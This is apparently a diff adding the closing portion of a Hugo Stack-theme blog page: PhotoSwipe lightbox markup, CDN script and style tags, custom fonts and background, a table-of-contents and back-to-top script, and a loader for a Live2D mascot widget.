+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
